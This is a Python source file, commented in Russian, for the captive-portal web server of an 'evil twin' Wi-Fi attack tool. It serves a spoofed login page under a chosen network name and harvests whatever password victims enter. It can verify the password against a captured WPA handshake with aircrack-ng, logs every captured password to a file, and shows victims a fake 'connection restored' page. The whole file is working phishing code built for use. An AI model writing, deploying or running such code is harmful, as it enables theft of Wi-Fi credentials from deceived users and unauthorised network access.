#!/usr/bin/env python3
"""
Веб-сервер captive-портала для evil twin.

Запускается отдельным процессом:
    python3 -m wifitool.portal_server --root <dir> --essid "<ESSID>" \
        --creds <file> [--handshake <cap> --bssid <mac>] [--port 80]

Поведение:
  - GET: отдаёт файл из <root>, если он существует; иначе index.html
    (любой неизвестный путь = портал → срабатывает «вход в сеть» у ОС).
  - POST: вытаскивает введённый пароль, (опц.) проверяет его по handshake
    через aircrack-ng, пишет результат в creds-файл и в stdout.
  - В index.html подставляются плейсхолдеры {{ESSID}} и {{ERROR}}.

Контракт шаблона: форма шлёт POST, поле пароля называется password
(также принимаются pass/pwd/key/psk/wifi_password).
"""

import os
import sys
import time
import argparse
import tempfile
import subprocess
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PASSWORD_FIELDS = ("password", "pass", "pwd", "key", "psk", "wifi_password")

CONFIG = {
    "root": ".",
    "essid": "Wi-Fi",
    "creds": "captured.txt",
    "handshake": None,
    "bssid": None,
}

SUCCESS_HTML = """<!doctype html><html lang="ru"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Готово</title><style>body{{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
background:#f3f4f6;color:#111827;display:flex;min-height:100vh;align-items:center;
justify-content:center;margin:0}}.c{{background:#fff;padding:32px;border-radius:16px;
box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center;max-width:360px}}
h1{{color:#059669}}</style></head><body><div class="c">
<h1>&#10003; Подключение восстановлено</h1>
<p>Спасибо. Соединение с сетью {essid} восстановлено.</p></div></body></html>"""


def _read_index(error_html=""):
    path = os.path.join(CONFIG["root"], "index.html")
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            html = f.read()
    except Exception:
        html = "<h1>{{ESSID}}</h1><form method=POST action=/>" \
               "{{ERROR}}<input type=password name=password>" \
               "<button>OK</button></form>"
    html = html.replace("{{ESSID}}", CONFIG["essid"])
    html = html.replace("{{ERROR}}", error_html)
    return html.encode("utf-8")


def _validate_password(password):
    """
    Проверяет пароль по handshake через aircrack-ng.
    Возвращает:
      True  — пароль подходит к handshake;
      False — не подходит;
      None  — проверка не настроена (handshake не задан) -> принимаем как есть.
    """
    if not CONFIG["handshake"] or not CONFIG["bssid"]:
        return None
    if len(password) < 8:
        return False
    tmp = None
    try:
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write(password + "\n")
            tmp = f.name
        r = subprocess.run(
            ["aircrack-ng", "-a2", "-b", CONFIG["bssid"],
             "-w", tmp, CONFIG["handshake"]],
            capture_output=True, text=True, timeout=60
        )
        return "KEY FOUND" in (r.stdout + r.stderr)
    except Exception:
        return None
    finally:
        if tmp:
            try:
                os.unlink(tmp)
            except OSError:
                pass


def _record(password, verdict):
    stamp = time.strftime("%Y-%m-%d %H:%M:%S")
    if verdict is True:
        tag = "OK (совпал с handshake)"
    elif verdict is False:
        tag = "НЕВЕРНЫЙ (не совпал с handshake)"
    else:
        tag = "не проверен"
    line = f"[{stamp}] {CONFIG['essid']!r}  пароль: {password!r}  — {tag}"
    print("\n[+] " + line, flush=True)
    try:
        with open(CONFIG["creds"], "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[!] Не удалось записать в creds-файл: {e}", flush=True)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass  # не засоряем окно логами каждого запроса

    def _send_html(self, body, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(body)
        except BrokenPipeError:
            pass

    def _serve_static_or_index(self):
        # Пытаемся отдать существующий файл из root (css/js/картинки шаблона).
        rel = self.path.split("?", 1)[0].lstrip("/")
        if rel and rel != "index.html":
            safe = os.path.normpath(os.path.join(CONFIG["root"], rel))
            root_abs = os.path.abspath(CONFIG["root"])
            if os.path.abspath(safe).startswith(root_abs) and os.path.isfile(safe):
                try:
                    with open(safe, "rb") as f:
                        data = f.read()
                except OSError:
                    data = None
                if data is not None:
                    ctype = _guess_type(safe)
                    self.send_response(200)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    try:
                        self.wfile.write(data)
                    except BrokenPipeError:
                        pass
                    return
        # Любой другой путь -> портал (captive portal detection сработает).
        self._send_html(_read_index())

    def do_GET(self):
        self._serve_static_or_index()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            length = 0
        body = self.rfile.read(length).decode("utf-8", errors="ignore") if length else ""
        fields = parse_qs(body)

        password = ""
        for name in PASSWORD_FIELDS:
            if name in fields and fields[name]:
                password = fields[name][0]
                break

        if not password:
            self._send_html(_read_index(
                '<div class="err">Введите пароль.</div>'))
            return

        verdict = _validate_password(password)
        _record(password, verdict)

        if verdict is False:
            # Неверный пароль — просим ещё раз (как делает airgeddon).
            self._send_html(_read_index(
                '<div class="err">Неверный пароль. Попробуйте ещё раз.</div>'))
        else:
            self._send_html(SUCCESS_HTML.format(essid=CONFIG["essid"]).encode("utf-8"))


def _guess_type(path):
    ext = os.path.splitext(path)[1].lower()
    return {
        ".css": "text/css",
        ".js": "application/javascript",
        ".png": "image/png",
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".gif": "image/gif",
        ".svg": "image/svg+xml",
        ".ico": "image/x-icon",
        ".woff": "font/woff",
        ".woff2": "font/woff2",
    }.get(ext, "application/octet-stream")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--root", required=True)
    ap.add_argument("--essid", default="Wi-Fi")
    ap.add_argument("--creds", required=True)
    ap.add_argument("--handshake", default=None)
    ap.add_argument("--bssid", default=None)
    ap.add_argument("--port", type=int, default=80)
    args = ap.parse_args()

    CONFIG.update(
        root=args.root, essid=args.essid, creds=args.creds,
        handshake=args.handshake, bssid=args.bssid,
    )

    print(f"[*] Портал запущен на :{args.port}  (ESSID: {args.essid!r})")
    if CONFIG["handshake"]:
        print(f"[*] Пароли проверяются по handshake: {CONFIG['handshake']}")
    else:
        print("[*] Handshake не задан — пароли сохраняются без проверки.")
    print("[*] Введённые пароли появятся ниже. Ctrl+C — остановить.\n")

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
